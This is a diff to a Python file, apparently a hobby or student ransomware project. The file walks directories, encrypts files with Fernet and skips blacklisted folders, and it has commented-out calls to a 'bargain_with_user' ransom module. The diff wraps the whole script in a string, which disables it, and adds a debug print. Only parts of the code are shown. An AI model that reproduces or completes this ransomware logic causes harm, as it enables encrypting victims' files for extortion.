@@ -1,6 +1,6 @@
-import os
-from cryptography.fernet import Fernet
-from extract import extract_file
+'''#import os
+#from cryptography.fernet import Fernet
+#from extract import extract_file
 
 
 def encrypt_file(filename: str, key: str):
@@ -30,6 +30,7 @@ def process_directory(directory: str, key: str, blacklist: list[str]):
     :param blacklist: Represents the directories that we don't want to encrypt
     :return: None
     """
+    print(f"Traversing directory {directory}")
     # Unpacks the provided directory as a 3-tuple consisting of directory path, directory names, and file names
     for root, dir, files in os.walk(directory):
         # Ensures that the program doesn't accidentally encrypt itself!
@@ -89,7 +90,7 @@ def main():
 
     # Represents folders to avoid encrypting for safety of host computer whilst maintaining functionality
     # of the ransomware.
-    blacklist: list[str] = []
+    blacklist: list[str] = ["New folder"]
 
     # Directories to encrypt in their entirety
     # TODO: Update as needed for testing purposes
@@ -107,9 +108,10 @@ def main():
     print("Encryption successful!")
 
     # Runs the bargaining application
-    #Fexec("import bargain_with_user")
+    #exec("import bargain_with_user")
     #exec(f"{code_to_bargain_with_user}")
 
 
 main()
 
+'''
